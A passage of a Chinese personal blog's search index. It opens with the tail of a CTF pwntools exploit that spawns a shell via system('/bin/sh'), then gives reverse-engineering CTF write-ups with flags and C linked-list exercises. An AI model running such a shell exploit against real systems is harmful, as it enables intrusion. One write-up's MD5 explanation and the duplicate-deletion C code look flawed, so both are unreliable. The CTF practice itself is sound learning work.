class="hljs-number">0xeb</span>+p32(system_addr)+p32(<span class="hljs-number">1</span>)+p32(bin_sh_addr)<br>a.sendline(payload2)<br>a.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向做题记录</title>
    <link href="/2022/01/24/%E9%80%86%E5%90%91%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/01/24/%E9%80%86%E5%90%91%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="特殊的base64">特殊的base64</h1><p>这道题故名思意 ，肯定是base64改变字母表，顺便复习下之前写过的脚本</p><p>首先打开ida先找改变后的字母表，找到后再找到密文就可以得到flag了。</p><p><img src="https://s2.loli.net/2022/01/24/GTwqYPMSnQc4gvp.png"alt="屏幕截图 2022-01-21 151916" /> <imgsrc="https://s2.loli.net/2022/01/24/J9GokZfdKySlB4b.png"alt="屏幕截图 2022-01-21 151830" /></p><h1 id="re4-unvm-me">re4-unvm-me</h1><p>为什么开始做攻防世界的题了，因为buu后面的题有亿点点难。这道题时py反编译，用在线网站<ahref="https://tool.lu/pyc/">python反编译 - 在线工具(tool.lu)</a>可以快速得到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit http://tool.lu/pyc/ for more information</span><br><span class="hljs-keyword">import</span> md5<br>md5s = [<br>    <span class="hljs-number">0x831DAA3C843BA8B087C895F0ED305CE7L</span>,<br>    <span class="hljs-number">0x6722F7A07246C6AF20662B855846C2C8L</span>,<br>    <span class="hljs-number">0x5F04850FEC81A27AB5FC98BEFA4EB40CL</span>,<br>    <span class="hljs-number">0xECF8DCAC7503E63A6A3667C5FB94F610L</span>,<br>    <span class="hljs-number">0xC0FD15AE2C3931BC1E140523AE934722L</span>,<br>    <span class="hljs-number">0x569F606FD6DA5D612F10CFB95C0BDE6DL</span>,<br>    <span class="hljs-number">0x68CB5A1CF54C078BF0E7E89584C1A4EL</span>,<br>    <span class="hljs-number">0xC11E2CD82D1F9FBD7E4D6EE9581FF3BDL</span>,<br>    <span class="hljs-number">0x1DF4C637D625313720F45706A48FF20FL</span>,<br>    <span class="hljs-number">0x3122EF3A001AAECDB8DD9D843C029E06L</span>,<br>    <span class="hljs-number">0xADB778A0F729293E7E0B19B96A4C5A61L</span>,<br>    <span class="hljs-number">0x938C747C6A051B3E163EB802A325148EL</span>,<br>    <span class="hljs-number">0x38543C5E820DD9403B57BEFF6020596DL</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Can you turn me back to python ? ...&#x27;</span><br>flag = raw_input(<span class="hljs-string">&#x27;well as you wish.. what is the flag: &#x27;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) &gt; <span class="hljs-number">69</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;nice try&#x27;</span><br>    exit()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) % <span class="hljs-number">5</span> != <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;nice try&#x27;</span><br>    exit()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(flag), <span class="hljs-number">5</span>):<br>    s = flag[i:i + <span class="hljs-number">5</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0x&#x27;</span> + md5.new(s).hexdigest(), <span class="hljs-number">16</span>) != md5s[i / <span class="hljs-number">5</span>]:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;nice try&#x27;</span><br>        exit()<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Congratz now you have the flag&#x27;</span><br><br></code></pre></td></tr></table></figure><p>flag的长度小于69且是五的倍数，然后flag每五个一组和上面给的MD5进行对比，所以只要把上面的MD5全部拼在一起就可以得到flag</p><p>flag：ALEXCTF{dv5d4s2vj8nk43s8d8l6m1n5l67ds9v41n52nv37j481h3d28n4b6v3k}</p><h1 id="流浪者">流浪者</h1><figure><img src="https://s2.loli.net/2022/01/24/Tpo4tU8BXnqSlrx.png"alt="屏幕截图 2022-01-23 142623" /><figcaption aria-hidden="true">屏幕截图 2022-01-23 142623</figcaption></figure><figure><img src="https://s2.loli.net/2022/01/24/yWDAzLBiJu1nSkN.png"alt="屏幕截图 2022-01-23 142614" /><figcaption aria-hidden="true">屏幕截图 2022-01-23 142614</figcaption></figure><p>题目先给出了str1，然后让str1的每个元素和字母表进行对比，反着来可以得到a1(v5),v5(在原函数中也是进行了变化，因此可以将v5逆回去得到flag</p><figure><img src="https://s2.loli.net/2022/01/24/be1hB82MXUWRIJL.png"alt="屏幕截图 2022-01-23 142523" /><figcaption aria-hidden="true">屏幕截图 2022-01-23 142523</figcaption></figure><p>flag:flag{j0rXI4bTeustBiIGHeCF70DDM}</p><h1 id="actf-universe_final_ans">actf universe_final_ans</h1><p>打开ida发现有一个条件函数和一个比较函数，说明程序关键在这两个函数</p><figure><img src="https://s2.loli.net/2022/01/24/HRDikdZKmMbJlhj.png"alt="屏幕截图 2022-01-13 165706" /><figcaption aria-hidden="true">屏幕截图 2022-01-13 165706</figcaption></figure><p>打开第一个函数发现是方程组，用这库写完后得到前一半flag</p><figure><img src="https://s2.loli.net/2022/01/24/iWRNIGDpUMyJ1La.png"alt="屏幕截图 2022-01-13 165807" /><figcaption aria-hidden="true">屏幕截图 2022-01-13 165807</figcaption></figure><figure><img src="https://s2.loli.net/2022/01/24/VyuTmkqInojKC7B.png"alt="屏幕截图 2022-01-13 165432" /><figcaption aria-hidden="true">屏幕截图 2022-01-13 165432</figcaption></figure><figure><img src="https://s2.loli.net/2022/01/24/S1pJ7ByM4qiANec.png"alt="屏幕截图 2022-01-13 165442" /><figcaption aria-hidden="true">屏幕截图 2022-01-13 165442</figcaption></figure><p>第二个函数我死活分析不出来，卡住了。后来实在没办法就去参考了下题解，发现大家都没分析出来第二个函数，都是采用运行elf文件得到第二个部分。给了我启示，不要死磕在解出函数，如果程序有两个函数，可以尝试下将第一个部分的flag带入，说不定就能得到第二部分flag</p><h1 id="buuctf-刮开有奖">buuctf 刮开有奖</h1><p>用ida打开后发现是windows程序，同时看了下字符串，出现了ABCD.....789这类字符串，怀疑有base64加密，只调用了DialogBoxParamA这个api，打开dialogfunc函数后发现了主程序</p><p><img src="https://s2.loli.net/2022/01/24/GrjdxTSAtQHiWmY.png" /></p><p>对4010F0函数进行封装后的得到v7变化后的值</p><figure><img src="https://s2.loli.net/2022/01/24/hmUTsNQ4bVOxBLE.png"alt="屏幕截图 2022-01-15 151601" /><figcaption aria-hidden="true">屏幕截图 2022-01-15 151601</figcaption></figure><p>点开v4v5调用的sub_401000发现调用了BCD....789这个字符串，肯定了用base64加密，base64解密后，将每个字符串对应string下标后得到flag：flag{UJWP1jMp}</p><h1 id="wusctf2020-level1">wusctf2020 level1</h1><p>用ida打开程序后发现主函数特别简单就是进行了移位和相乘，并且用fclosefopenfprintf将得到的数据存入了flag.txt文件中，只要将flag.txt文件中的数据提取出来，并且进行反移位后就可以得到flag</p><figure><img src="https://s2.loli.net/2022/01/24/xQZJlPzakIDAyLO.png"alt="屏幕截图 2022-01-15 154722.png" /><figcaption aria-hidden="true">屏幕截图 2022-01-15154722.png</figcaption></figure><figure><img src="https://s2.loli.net/2022/01/24/r7lXPvSLxIGuFBN.png"alt="屏幕截图 2022-01-15 154732.png" /><figcaption aria-hidden="true">屏幕截图 2022-01-15154732.png</figcaption></figure><p>flag为flag{d9-dE6-20c}</p><h1 id="mrctf2020transform">[MRCTF2020]Transform</h1><p>首先用ida打开找到主函数后跟进分析</p><figure><img src="https://s2.loli.net/2022/01/24/6tVNaeXmZA1R7Fv.png"alt="屏幕截图 2022-01-15 162805" /><figcaption aria-hidden="true">屏幕截图 2022-01-15 162805</figcaption></figure><p><strong>这里要注意一点：存储flag的str字符串在进行异或时是str[dword_40f040]所以会先把str打乱</strong></p><p>发现主函数进行了异或操作，于是找到数据</p><figure><img src="https://s2.loli.net/2022/01/24/yLONPEca5tU4BhZ.png"alt="屏幕截图 2022-01-15 162818" /><figcaption aria-hidden="true">屏幕截图 2022-01-15 162818</figcaption></figure><p>用shift+e提出数据后写脚本得到答案即可</p><figure><img src="https://s2.loli.net/2022/01/24/g9UroXl5PDdvRFw.png"alt="屏幕截图 2022-01-15 163413" /><figcaption aria-hidden="true">屏幕截图 2022-01-15 163413</figcaption></figure><p>flag为flag{Tr4nsp0sltiON_Clph3r_1s_3z}</p><h1 id="flareon4-login">FlareOn4 login</h1><p>第一次做java类的题目，挺简单的但还是记录一下，用vscode打开html文件后得到</p><figure><img src="https://s2.loli.net/2022/01/24/eOdtAF7XUlYJomL.png"alt="屏幕截图 2022-01-15 163809" /><figcaption aria-hidden="true">屏幕截图 2022-01-15 163809</figcaption></figure><p>可知用了rot13加密，解密后就可以得到flag：flag{ClientSideLoginsAreEasy@flare-on.com}</p><h1 id="flareon6-overlong">FlareOn6 OverLong</h1><p>首先看了下题目名字overlong和hint:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The secret <span class="hljs-keyword">of</span> this next challenge is cleverly hidden. However, <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> approach, finding <span class="hljs-keyword">the</span> solution will <span class="hljs-keyword">not</span> take <span class="hljs-keyword">an</span> &lt;b&gt;overlong&lt;/b&gt; amount <span class="hljs-keyword">of</span> <span class="hljs-built_in">time</span>.<br></code></pre></td></tr></table></figure><p>我猜测真正的数据应该是被隐藏了。</p><p>先用IDA打开程序，发现程序除了一个MessageBox api什么都没有</p><figure><img src="https://s2.loli.net/2022/01/24/glzxpuGfbeIKPnZ.png"alt="屏幕截图 2022-01-16 100728" /><figcaption aria-hidden="true">屏幕截图 2022-01-16 100728</figcaption></figure><p>于是逐个分析函数</p><p><img src="https://s2.loli.net/2022/01/24/4f6sLKrIpQZNedB.png"alt="屏幕截图 2022-01-16 101626" /> <imgsrc="https://s2.loli.net/2022/01/24/LERdtTm2ABzIlP5.png"alt="屏幕截图 2022-01-16 101638" /></p><p>发程序在401160函数执行了28次，同时402008处的数据给出了，但特别多超过了28个</p><figure><img src="https://s2.loli.net/2022/01/24/siUNQ1bmMeEVRr2.png"alt="屏幕截图 2022-01-16 101717" /><figcaption aria-hidden="true">屏幕截图 2022-01-16 101717</figcaption></figure><p>于是我开始分析，但没分析出来QAQ，看了题解后得知要使用动态调试。于是又开始跟着题解用OD开始解题，</p><p>先是F9运行了下程序，发现窗口出现的英文字母的总和正好是0x1c，于是开始寻找含有0x1c的指令，并将其数值改大，就可以出现flag:flag{I_a_M_t_h_e_e_n_C_o_D_i_n_g@flare_on.com}</p><p>动态调试我刚刚接触，做的比较少，我对于使用题目要使用动态调试的情况的理解：第一个就是程序基本没有字符串或者没有给出明显的提示；二是程序本身比较复杂或者给出的数值很大很多，需要一个一个的动态给出。</p><p>这是我目前的理解，以后可能做多了会有更多的理解。</p><h1 id="mrctf2020hello_world_go">[MRCTF2020]hello_world_go</h1><figure><img src="https://s2.loli.net/2022/01/24/134v5pJlgBWCkiw.png"alt="屏幕截图 2022-01-09 114941" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 114941</figcaption></figure><p>观看反编译找到关键函数cmpstring，得知flag肯定和这个比较函数有关，跟进后就发现了flag:flag{hello_world_gogogo};</p><h1 id="wustctf2020level3">[WUSTCTF2020]level3</h1><figure><img src="https://s2.loli.net/2022/01/16/EqZoXHWplwLSd6Q.png"alt="屏幕截图 2022-01-09 130825" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 130825</figcaption></figure><p>看题目给出的提示发现这道题要用到base64加密，但又和普通的base64加密有所不同。于是继续查找函数。</p><p>找到这个可疑的函数，后发现了base64字母表的变换规律：</p><figure><img src="https://s2.loli.net/2022/01/24/ZubzFDVhTyqBck5.png"alt="屏幕截图 2022-01-09 130833" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 130833</figcaption></figure><figure><img src="https://s2.loli.net/2022/01/16/12krvMD7SpbAKEm.png"alt="屏幕截图 2022-01-09 115825" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 115825</figcaption></figure><p>但是因为不会写变异后的base64解密脚本，于是查看了题解，按着题解的脚本写了一遍后得到了flag：</p><figure><img src="https://s2.loli.net/2022/01/16/gd4V5e6DUMf9a7s.png"alt="屏幕截图 2022-01-09 115900" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 115900</figcaption></figure><p>flag{Base64_is_the_start_of_reverse}</p><h1 id="wustctf2020cr0ssfun">[WUSTCTF2020]Cr0ssfun</h1><p>这题比较常规，反编译后发现了主函数中的关键函数check()，点进去后发现他给出了a1数组的每个下标的字母，将每个字母提取出来后，输出就可以得到flag:</p><figure><img src="https://s2.loli.net/2022/01/16/nPQ5dLbgZU9yXmA.png"alt="屏幕截图 2022-01-09 130041" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 130041</figcaption></figure><figure><img src="https://s2.loli.net/2022/01/16/D5TXUHAFtYiLE3S.png"alt="屏幕截图 2022-01-09 130050" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 130050</figcaption></figure><figure><img src="https://s2.loli.net/2022/01/16/CK1QB9LPd4oJjMN.png"alt="屏幕截图 2022-01-09 130059" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 130059</figcaption></figure><figure><img src="https://s2.loli.net/2022/01/16/zWkb73oe9Jtdapx.png"alt="屏幕截图 2022-01-09 130106" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 130106</figcaption></figure><figure><img src="https://s2.loli.net/2022/01/16/L3l2eT58sbNMAyd.png"alt="屏幕截图 2022-01-09 130113" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 130113</figcaption></figure><figure><img src="C:\Users\HXDCHLL\Pictures\屏幕截图%202022-01-09%20130027.png"alt="屏幕截图 2022-01-09 130027" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 130027</figcaption></figure><p>得到flag: wctf2020{cpp@nd_r3verse<em><span class="citation"data-cites="re_fu">@re_fu</span>} 修改为flag{cpp@nd_r3verse</em>@re_fu}</p><h1 id="flareon3challenge1">[FlareOn3]Challenge1</h1><figure><img src="https://s2.loli.net/2022/01/16/Gxjb3mAaQi9vTZ4.png"alt="屏幕截图 2022-01-09 131624" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 131624</figcaption></figure><figure><img src="https://s2.loli.net/2022/01/16/fRhoqI7iyT3pPum.png"alt="屏幕截图 2022-01-09 131700" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 131700</figcaption></figure><figure><img src="https://s2.loli.net/2022/01/16/7DPbYnIXF3zq4N8.png"alt="20210203123555487" /><figcaption aria-hidden="true">20210203123555487</figcaption></figure><figure><img src="https://s2.loli.net/2022/01/16/hlFsgCfJOPNzrHV.png"alt="20210203123510173" /><figcaption aria-hidden="true">20210203123510173</figcaption></figure><p>我一个一个改str1后再base64得到了flag</p><p>flag{sh00ting_phish_in_a_barrel@flare-on.com}</p><p>后来看了题解按着题解的步骤，抄了下代码：</p><h1 id="actf新生赛2020oruga">[ACTF新生赛2020]Oruga</h1><p>首先找关键函数，发现是迷宫题：</p><figure><img src="https://s2.loli.net/2022/01/16/ZElOLsWneyQi5NV.png"alt="屏幕截图 2022-01-09 133709" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 133709</figcaption></figure><p>于是开始找迷宫，发现以下汇编语言，找到迷宫：</p><figure><img src="https://s2.loli.net/2022/01/16/wxWLcH1fiG7ETr8.png"alt="屏幕截图 2022-01-09 133724" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 133724</figcaption></figure><p>输出迷宫：</p><figure><img src="https://s2.loli.net/2022/01/16/ICg3ByZi7LeOfmk.png"alt="屏幕截图 2022-01-09 134115" /><figcaption aria-hidden="true">屏幕截图 2022-01-09 134115</figcaption></figure><p>手打得到flag:flag{MEWEMEWJMEWJM}</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>reverse</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>单链表的简单习题</title>
    <link href="/2022/01/20/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E7%AE%80%E5%8D%95%E4%B9%A0%E9%A2%98/"/>
    <url>/2022/01/20/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E7%AE%80%E5%8D%95%E4%B9%A0%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="合并两个链表">1.合并两个链表</h1><p>将两个升序链表合并为一个新的 升序链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。</p><figure><img src="https://s2.loli.net/2022/01/20/2bjHxR8dDm7frk1.png"alt="屏幕截图 2022-01-20 150104" /><figcaption aria-hidden="true">屏幕截图 2022-01-20 150104</figcaption></figure><p>示例 1：</p><p>输入：l1 = [1,2,4], l2 = [1,3,4] 输出：[1,1,2,3,4,4]</p><blockquote><p>暴力法：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//首先要创建一个头节点和一个用来链接两个链表的节点,让两个链表一个一个比较然后链接起来</span><br><span class="hljs-keyword">struct</span> ListNode* <span class="hljs-title function_">mergeTwoLists</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* list1, <span class="hljs-keyword">struct</span> ListNode* list2)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">HeadNode</span>=</span>(<span class="hljs-keyword">struct</span> ListNode* )<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ListNode));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">pMove</span>=</span>HeadNode;<br>    <span class="hljs-keyword">while</span>(list1&amp;&amp;list2)&#123;<br>        <span class="hljs-keyword">if</span>(list1-&gt;val&lt;=list2-&gt;val)&#123;<br>            pMove-&gt;next=list1;<br>            list1=list1-&gt;next;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            pMove-&gt;next=list2;<br>            list2=list2-&gt;next;<br>        &#125;<br>        pMove=pMove-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(list1) pMove-&gt;next=list1;<br>    <span class="hljs-keyword">else</span> pMove-&gt;next=list2;<br>    <span class="hljs-keyword">return</span> HeadNode-&gt;next;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="逆转链表">2.逆转链表</h1><p>给你单链表的头节点 <code>head</code>，请你反转链表，并返回反转后的链表。</p><p><img src="https://s2.loli.net/2022/01/22/nmuptsqLGyOIi8z.jpg"alt="rev1ex1" /> &gt; 输入：head = [1,2] &gt; 输出：[2,1]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-keyword">struct</span> ListNode* <span class="hljs-title function_">reverseList</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* head)</span>&#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">pre</span>=</span><span class="hljs-literal">NULL</span>;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">cur</span>=</span>head;<br>      <span class="hljs-keyword">while</span>(cur)<br>      &#123;<br>          <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">next</span>=</span>cur-&gt;next;<span class="hljs-comment">//链表只会保存下一个节点，当逆转的时候原来的下一个节点就会消失，所以必须有一个结构体指针记录下一个节点</span><br>          cur-&gt;next=pre;<br>          pre=cur;<br>          cur=next;<br>      &#125;<br>      <span class="hljs-keyword">return</span> pre;<span class="hljs-comment">//逆转后原头节点变成了尾见点，原来的尾节点变成了头节点，因为pre一直记录的到cur尾NULL的时候，所以pre就是现在的尾节点。</span><br>&#125;<br></code></pre></td></tr></table></figure><p>以下是动图：<imgsrc="https://s2.loli.net/2022/01/22/6xJIoQhElcHn78Z.gif"alt="cacea8121df8208784647d84e8a464cb17dfb8ef68a8f9f87fdae58f334b6746-file_1597038838572" /></p><h1 id="删除链表中重复的节点">3. 删除链表中重复的节点</h1><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ocaml">在一个排序的链表中，存在重复的节点，请删除该链表中重复的节点，重复的节点不保留。<br><br>数据范围<br>链表中节点 <span class="hljs-keyword">val</span> 值取值范围 [<span class="hljs-number">0</span>,<span class="hljs-number">100</span>]。<br>链表长度 [<span class="hljs-number">0</span>,<span class="hljs-number">100</span>]。<br><br>样例<span class="hljs-number">1</span><br>输入：<span class="hljs-number">1</span>-&gt;<span class="hljs-number">2</span>-&gt;<span class="hljs-number">3</span>-&gt;<span class="hljs-number">3</span>-&gt;<span class="hljs-number">4</span>-&gt;<span class="hljs-number">4</span>-&gt;<span class="hljs-number">5</span><br><br>输出：<span class="hljs-number">1</span>-&gt;<span class="hljs-number">2</span>-&gt;<span class="hljs-number">5</span><br>样例<span class="hljs-number">2</span><br>输入：<span class="hljs-number">1</span>-&gt;<span class="hljs-number">1</span>-&gt;<span class="hljs-number">1</span>-&gt;<span class="hljs-number">2</span>-&gt;<span class="hljs-number">3</span><br><br>输出：<span class="hljs-number">2</span>-&gt;<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Note: The returned array must be malloced, assume caller calls free().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> ListNode* <span class="hljs-title function_">deleteDuplication</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* head)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">pHead</span>=</span>(<span class="hljs-keyword">struct</span> ListNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> ListNode));<br>    pHead-&gt;next=head;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">pre</span>=</span>pHead;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">cur</span>=</span>head;<br>    <span class="hljs-keyword">if</span>(!head) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">while</span>(cur)<br>    &#123;<br>        <span class="hljs-keyword">while</span>(cur&amp;&amp;pre-&gt;next-&gt;val==cur-&gt;val) cur=cur-&gt;next;<br>        <span class="hljs-keyword">if</span>(pre-&gt;next-&gt;next==cur) pre=pre-&gt;next;<br>        <span class="hljs-keyword">else</span> pre-&gt;next=cur;<br>    &#125;<br>    <span class="hljs-keyword">return</span> pHead-&gt;next;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>warning:不能采用pre和cur都是首节点，然后开始判断的情况，因为会有这种特殊情况：从首节点开始到尾就是重复了</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>链表</tag>
      
      <tag>数据结构</tag>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
